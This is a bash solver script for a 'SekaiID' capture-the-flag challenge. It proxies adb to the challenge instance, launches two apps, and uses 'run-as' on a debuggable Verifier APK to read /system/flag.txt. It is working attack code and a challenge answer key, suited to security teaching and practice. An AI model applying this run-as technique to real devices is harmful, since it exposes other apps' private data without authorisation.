#!/usr/bin/env bash
# SekaiID solver — pulls the flag via adb run-as on the debuggable Verifier APK.
#
# Usage:
#   ./run.sh sekaiid-XXXXXXXXXXX.instancer.sekai.team 1337
#
# Requires:
#   - python3
#   - adb (Android SDK platform-tools) in PATH

set -eu

HOST="${1:?host required (e.g. sekaiid-XXXXXXXX.instancer.sekai.team)}"
PORT="${2:?port required (e.g. 1337)}"
ADB="${ADB:-adb}"

script_dir="$(cd "$(dirname "$0")"; pwd)"
proxy="$script_dir/../handout/tls_proxy.py"

if [ ! -f "$proxy" ]; then
    echo "tls_proxy.py not found at $proxy" >&2
    exit 1
fi

# 1) Start TLS-wrapping proxy so adb can speak to the instancer.
python3 "$proxy" "$HOST" "$PORT" > /tmp/sekaiid_proxy.log 2>&1 &
proxy_pid=$!
trap 'kill "$proxy_pid" 2>/dev/null || true' EXIT
sleep 2

# 2) Attach adb.
"$ADB" connect 127.0.0.1:5555 >/dev/null
sleep 1
"$ADB" devices

# 3) Boot the apps once so /system/flag.txt is in scope of run-as.
"$ADB" shell "am start -n com.sekai.id/.MainActivity"       >/dev/null
"$ADB" shell "am start -n com.sekai.verifier/.MainActivity" >/dev/null
sleep 2

# 4) The Verifier APK ships with android:debuggable="true". /system/flag.txt is
#    owned by the Verifier's UID, so run-as can read it.
flag="$("$ADB" shell run-as com.sekai.verifier cat /system/flag.txt | tr -d '\r')"
echo
echo "FLAG: $flag"
